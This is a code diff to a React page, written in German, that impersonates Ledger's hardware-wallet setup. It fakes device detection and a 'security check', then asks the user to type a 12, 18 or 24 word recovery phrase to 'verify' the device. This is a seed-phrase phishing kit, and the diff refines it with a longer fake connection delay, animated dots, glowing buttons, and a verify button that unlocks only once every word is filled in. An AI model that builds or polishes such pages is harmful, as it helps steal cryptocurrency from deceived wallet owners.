@@ -31,6 +31,9 @@ const devices: { name: string; short: string; svg: (p: IconProps) => React.React
 
 type View = "select" | "connecting" | "detected" | "wizard";
 
+const primaryButton =
+  "rounded-full bg-white px-8 py-3 text-base font-semibold text-black transition-all duration-300 hover:scale-105 hover:bg-white hover:shadow-[0_0_25px_rgba(167,139,250,0.6)]";
+
 function LedgerPage() {
   const [view, setView] = useState<View>("select");
   const [selectedIdx, setSelectedIdx] = useState<number | null>(null);
@@ -39,7 +42,7 @@ function LedgerPage() {
 
   useEffect(() => {
     if (view !== "connecting") return;
-    const t = setTimeout(() => setView("detected"), 4000);
+    const t = setTimeout(() => setView("detected"), 5000);
     return () => clearTimeout(t);
   }, [view]);
 
@@ -120,6 +123,11 @@ function SelectView({ onPick }: { onPick: (idx: number) => void }) {
 
 function ConnectingView({ device }: { device: { name: string; short: string; svg: (p: IconProps) => React.ReactElement } }) {
   const Icon = device.svg;
+  const [dots, setDots] = useState(1);
+  useEffect(() => {
+    const id = setInterval(() => setDots((d) => (d % 3) + 1), 500);
+    return () => clearInterval(id);
+  }, []);
   return (
     <div className="flex flex-col items-center text-center">
       <div className="relative mb-10 flex h-64 w-64 items-center justify-center">
@@ -134,7 +142,7 @@ function ConnectingView({ device }: { device: { name: string; short: string; svg
       <div className="mt-6 flex items-center gap-3 text-gray-300">
         <Loader2 className="h-5 w-5 animate-spin text-[#a78bfa]" />
         <span>
-          {device.short} erkannt – verifiziere Gerät
+          verbinde<span className="inline-block w-6 text-left">{".".repeat(dots)}</span>
         </span>
       </div>
     </div>
@@ -148,11 +156,7 @@ function DetectedView({ onContinue }: { onContinue: () => void }) {
       <p className="max-w-xl text-lg text-white">
         Dein Gerät wurde erkannt, klicke nun auf <span className="text-[#a78bfa]">"Weiter"</span> um einen Sicherheitscheck durchzuführen
       </p>
-      <button
-        type="button"
-        onClick={onContinue}
-        className="mt-8 rounded-full bg-white px-8 py-3 text-base font-semibold text-black transition-all hover:bg-gray-200"
-      >
+      <button type="button" onClick={onContinue} className={`mt-8 ${primaryButton}`}>
         Weiter
       </button>
     </div>
@@ -176,15 +180,18 @@ function WizardView({
       <div className="mt-12 w-full">
         {step === 1 && (
           <div className="flex flex-col items-center">
+            <div className="mb-4">
+              <svg width="36" height="36" viewBox="0 0 30 30" fill="none">
+                <circle cx="15" cy="15" r="10" stroke="#a78bfa" strokeWidth="2" />
+                <line x1="15" y1="8" x2="15" y2="16" stroke="#a78bfa" strokeWidth="2" strokeLinecap="round" />
+                <circle cx="15" cy="20" r="1.5" fill="#a78bfa" />
+              </svg>
+            </div>
             <h2 className="text-2xl font-semibold text-white">Gerät verifizieren</h2>
             <p className="mt-3 max-w-xl text-gray-400">
               Verifiziere dein Ledger-Gerät, indem du deine Recovery-Phrase eingibst, damit wir die Echtheit deines Geräts bestätigen können.
             </p>
-            <button
-              type="button"
-              onClick={onVerifyClick}
-              className="mt-8 rounded-full bg-white px-8 py-3 text-base font-semibold text-black transition-all hover:bg-gray-200"
-            >
+            <button type="button" onClick={onVerifyClick} className={`mt-8 ${primaryButton}`}>
               Gerät verifizieren
             </button>
           </div>
@@ -196,11 +203,7 @@ function WizardView({
             <p className="mt-3 max-w-xl text-gray-400">
               Wir führen jetzt einen Sicherheitscheck deines Geräts durch.
             </p>
-            <button
-              type="button"
-              onClick={onNext}
-              className="mt-8 rounded-full bg-white px-8 py-3 text-base font-semibold text-black transition-all hover:bg-gray-200"
-            >
+            <button type="button" onClick={onNext} className={`mt-8 ${primaryButton}`}>
               Weiter
             </button>
           </div>
@@ -226,23 +229,28 @@ function StepIndicator({ step }: { step: 1 | 2 | 3 }) {
     { n: 3, label: "Bestätigung" },
   ] as const;
   return (
-    <div className="flex w-full items-center justify-between gap-2">
+    <div className="mx-auto flex w-full max-w-xl items-start justify-between">
       {steps.map((s, i) => {
         const active = step === s.n;
         const done = step > s.n;
         return (
-          <div key={s.n} className="flex flex-1 items-center">
-            <div className="flex flex-col items-center gap-2">
-              <div
-                className={`flex h-10 w-10 items-center justify-center rounded-full border-2 text-sm font-semibold transition-colors ${
-                  active
-                    ? "border-[#a78bfa] bg-[#a78bfa] text-white"
-                    : done
-                    ? "border-[#a78bfa] bg-[#a78bfa]/20 text-[#a78bfa]"
-                    : "border-white/20 text-gray-500"
-                }`}
-              >
-                {done ? <Check className="h-5 w-5" /> : s.n}
+          <div key={s.n} className="flex flex-1 items-start">
+            <div className="flex flex-1 flex-col items-center gap-2">
+              <div className="relative flex h-10 w-10 items-center justify-center">
+                {active && (
+                  <div className="absolute inset-0 -m-2 animate-pulse rounded-full bg-[#a78bfa]/60 blur-xl" />
+                )}
+                <div
+                  className={`relative flex h-10 w-10 items-center justify-center rounded-full border-2 text-sm font-semibold transition-colors ${
+                    active
+                      ? "border-[#a78bfa] bg-[#a78bfa] text-white"
+                      : done
+                      ? "border-[#a78bfa] bg-[#a78bfa]/20 text-[#a78bfa]"
+                      : "border-white/20 text-gray-500"
+                  }`}
+                >
+                  {done ? <Check className="h-5 w-5" /> : s.n}
+                </div>
               </div>
               <span
                 className={`text-xs sm:text-sm ${
@@ -253,7 +261,7 @@ function StepIndicator({ step }: { step: 1 | 2 | 3 }) {
               </span>
             </div>
             {i < steps.length - 1 && (
-              <div className={`mx-2 mb-6 h-px flex-1 ${step > s.n ? "bg-[#a78bfa]" : "bg-white/10"}`} />
+              <div className={`mt-5 h-px w-full flex-1 ${step > s.n ? "bg-[#a78bfa]" : "bg-white/10"}`} />
             )}
           </div>
         );
@@ -274,27 +282,47 @@ function SeedDialog({
   onVerified: () => void;
 }) {
   const [count, setCount] = useState<"12" | "18" | "24">("24");
+  const [words, setWords] = useState<string[]>(() => Array(24).fill(""));
+
+  useEffect(() => {
+    setWords(Array(Number(count)).fill(""));
+  }, [count]);
+
+  useEffect(() => {
+    if (!open) {
+      setWords(Array(Number(count)).fill(""));
+    }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [open]);
+
+  const complete = words.length > 0 && words.every((w) => w.trim().length > 0);
 
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
-      <DialogContent className="max-w-3xl border-none bg-white p-8 text-black sm:p-10">
+      <DialogContent className="max-w-2xl border-none bg-white p-8 text-black duration-500 data-[state=closed]:duration-300 data-[state=open]:slide-in-from-bottom-4 data-[state=open]:ease-out sm:p-10">
         <div className="flex flex-col items-center">
-          <img src={ledgerLogo} alt="Ledger" className="mb-6 h-8 w-auto" />
+          <img src={ledgerLogo} alt="Ledger" className="mb-6 h-12 w-auto" />
           <h3 className="text-xl font-semibold text-black">Gerät verifizieren</h3>
           <p className="mt-2 max-w-md text-center text-sm text-gray-600">
             Gib die Wörter deiner Recovery-Phrase in der richtigen Reihenfolge ein.
           </p>
 
           <Tabs value={count} onValueChange={(v) => setCount(v as "12" | "18" | "24")} className="mt-6 w-full">
-            <TabsList className="mx-auto grid w-full max-w-md grid-cols-3 bg-gray-100">
-              <TabsTrigger value="12" className="data-[state=active]:bg-white data-[state=active]:text-black">12 Wörter</TabsTrigger>
-              <TabsTrigger value="18" className="data-[state=active]:bg-white data-[state=active]:text-black">18 Wörter</TabsTrigger>
-              <TabsTrigger value="24" className="data-[state=active]:bg-white data-[state=active]:text-black">24 Wörter</TabsTrigger>
+            <TabsList className="mx-auto flex w-full max-w-md justify-center gap-2 bg-transparent p-0">
+              {(["12", "18", "24"] as const).map((c) => (
+                <TabsTrigger
+                  key={c}
+                  value={c}
+                  className="rounded-md bg-transparent px-4 py-2 text-sm text-gray-500 shadow-none transition-colors data-[state=active]:bg-gray-100 data-[state=active]:text-black data-[state=active]:shadow-none"
+                >
+                  {c} Wörter
+                </TabsTrigger>
+              ))}
             </TabsList>
 
             {(["12", "18", "24"] as const).map((c) => (
               <TabsContent key={c} value={c} className="mt-6">
-                <SeedGrid count={Number(c)} />
+                {count === c && <SeedGrid count={Number(c)} words={words} setWords={setWords} />}
               </TabsContent>
             ))}
           </Tabs>
@@ -302,7 +330,12 @@ function SeedDialog({
           <button
             type="button"
             onClick={onVerified}
-            className="mt-8 rounded-full bg-black px-10 py-3 text-base font-semibold text-white transition-all hover:bg-gray-800"
+            disabled={!complete}
+            className={`mt-8 rounded-full px-10 py-3 text-base font-semibold transition-all duration-300 ${
+              complete
+                ? "bg-[#a78bfa] text-white hover:scale-105 hover:bg-[#9370f0] hover:shadow-[0_0_25px_rgba(167,139,250,0.6)]"
+                : "cursor-not-allowed bg-gray-200 text-gray-400"
+            }`}
           >
             Verifizieren
           </button>
@@ -312,35 +345,36 @@ function SeedDialog({
   );
 }
 
-function SeedGrid({ count }: { count: number }) {
-  const [words, setWords] = useState<string[]>(() => Array(count).fill(""));
-
-  useEffect(() => {
-    setWords(Array(count).fill(""));
-  }, [count]);
-
+function SeedGrid({
+  count,
+  words,
+  setWords,
+}: {
+  count: number;
+  words: string[];
+  setWords: (w: string[]) => void;
+}) {
   return (
-    <div className="grid grid-cols-2 gap-3 sm:grid-cols-3">
+    <div className="grid grid-cols-2 gap-x-5 gap-y-4 sm:grid-cols-4">
       {Array.from({ length: count }).map((_, i) => {
-        const filled = words[i]?.length > 0;
+        const filled = (words[i] ?? "").length > 0;
         return (
           <div
             key={i}
-            className={`flex items-center gap-2 rounded-lg border px-3 py-2 transition-colors ${
-              filled ? "border-black bg-white" : "border-gray-200 bg-gray-50"
+            className={`flex items-center gap-1.5 border-b pb-1 transition-colors ${
+              filled ? "border-black" : "border-gray-300 focus-within:border-black"
             }`}
           >
-            <span className={`w-6 shrink-0 text-sm ${filled ? "text-black" : "text-gray-400"}`}>{i + 1}.</span>
+            <span className={`shrink-0 text-xs ${filled ? "text-black" : "text-gray-400"}`}>{i + 1}.</span>
             <input
               type="text"
-              value={words[i]}
+              value={words[i] ?? ""}
               onChange={(e) => {
                 const next = [...words];
                 next[i] = e.target.value;
                 setWords(next);
               }}
-              className={`w-full bg-transparent text-sm outline-none ${filled ? "text-black" : "text-gray-500 placeholder:text-gray-400"}`}
-              placeholder="Wort"
+              className={`w-full bg-transparent text-sm outline-none ${filled ? "text-black" : "text-gray-500"}`}
               autoComplete="off"
             />
           </div>
@@ -354,7 +388,7 @@ function SeedGrid({ count }: { count: number }) {
 
 function StaxIcon() {
   return (
-    <svg width="80" height="110" viewBox="0 0 80 110" fill="none" xmlns="http://www.w3.org/2000/svg" className="drop-shadow-[0_0_8px_rgba(167,139,250,0.25)]">
+    <svg width="80" height="110" viewBox="0 0 80 110" fill="none" xmlns="http://www.w3.org/2000/svg">
       <rect x="15" y="5" width="50" height="75" rx="6" fill="#222" stroke="#444" strokeWidth="1.5" />
       <rect x="20" y="15" width="40" height="55" rx="3" fill="#1a1a1a" stroke="#555" strokeWidth="1" />
       <rect x="25" y="20" width="30" height="8" rx="2" fill="#333" />
@@ -369,7 +403,7 @@ function StaxIcon() {
 
 function FlexIcon() {
   return (
-    <svg width="65" height="110" viewBox="0 0 65 110" fill="none" xmlns="http://www.w3.org/2000/svg" className="drop-shadow-[0_0_8px_rgba(167,139,250,0.25)]">
+    <svg width="65" height="110" viewBox="0 0 65 110" fill="none" xmlns="http://www.w3.org/2000/svg">
       <rect x="8" y="5" width="49" height="90" rx="8" fill="#2a2a2a" stroke="#444" strokeWidth="1.5" />
       <rect x="14" y="12" width="37" height="60" rx="4" fill="#1a1a1a" stroke="#555" />
       <rect x="18" y="18" width="29" height="6" rx="2" fill="#333" />
@@ -383,7 +417,7 @@ function FlexIcon() {
 
 function NanoGen5Icon() {
   return (
-    <svg width="75" height="110" viewBox="0 0 75 110" fill="none" xmlns="http://www.w3.org/2000/svg" className="drop-shadow-[0_0_8px_rgba(167,139,250,0.25)]">
+    <svg width="75" height="110" viewBox="0 0 75 110" fill="none" xmlns="http://www.w3.org/2000/svg">
       <rect x="10" y="10" width="55" height="75" rx="6" fill="#222" stroke="#444" strokeWidth="1.5" />
       <rect x="16" y="18" width="43" height="55" rx="3" fill="#1a1a1a" stroke="#555" />
       <rect x="20" y="22" width="35" height="5" rx="2" fill="#333" />
@@ -400,7 +434,7 @@ function NanoGen5Icon() {
 
 function NanoSIcon() {
   return (
-    <svg width="110" height="80" viewBox="0 0 110 80" fill="none" xmlns="http://www.w3.org/2000/svg" className="rotate-[-20deg] drop-shadow-[0_0_8px_rgba(167,139,250,0.25)]">
+    <svg width="110" height="80" viewBox="0 0 110 80" fill="none" xmlns="http://www.w3.org/2000/svg" className="rotate-[-20deg]">
       <rect x="5" y="25" width="95" height="28" rx="6" fill="#2a2a2a" stroke="#555" strokeWidth="1.5" />
       <rect x="18" y="30" width="45" height="18" rx="3" fill="#111" stroke="#444" />
       <text x="23" y="43" fontFamily="monospace" fontSize="8" fill="#888">••••</text>
@@ -413,7 +447,7 @@ function NanoSIcon() {
 
 function NanoSPlusIcon() {
   return (
-    <svg width="110" height="80" viewBox="0 0 110 80" fill="none" xmlns="http://www.w3.org/2000/svg" className="rotate-[-15deg] drop-shadow-[0_0_8px_rgba(167,139,250,0.25)]">
+    <svg width="110" height="80" viewBox="0 0 110 80" fill="none" xmlns="http://www.w3.org/2000/svg" className="rotate-[-15deg]">
       <rect x="5" y="22" width="100" height="32" rx="7" fill="#333" stroke="#555" strokeWidth="1.5" />
       <rect x="20" y="28" width="48" height="20" rx="3" fill="#111" stroke="#444" />
       <rect x="24" y="32" width="10" height="4" rx="1" fill="#222" />
@@ -428,7 +462,7 @@ function NanoSPlusIcon() {
 
 function NanoXIcon() {
   return (
-    <svg width="110" height="80" viewBox="0 0 110 80" fill="none" xmlns="http://www.w3.org/2000/svg" className="rotate-[-20deg] drop-shadow-[0_0_8px_rgba(167,139,250,0.25)]">
+    <svg width="110" height="80" viewBox="0 0 110 80" fill="none" xmlns="http://www.w3.org/2000/svg" className="rotate-[-20deg]">
       <rect x="5" y="20" width="100" height="38" rx="8" fill="#3a3a3a" stroke="#555" strokeWidth="1.5" />
       <rect x="20" y="27" width="55" height="24" rx="4" fill="#111" stroke="#444" />
       <rect x="25" y="31" width="13" height="5" rx="1" fill="#222" />
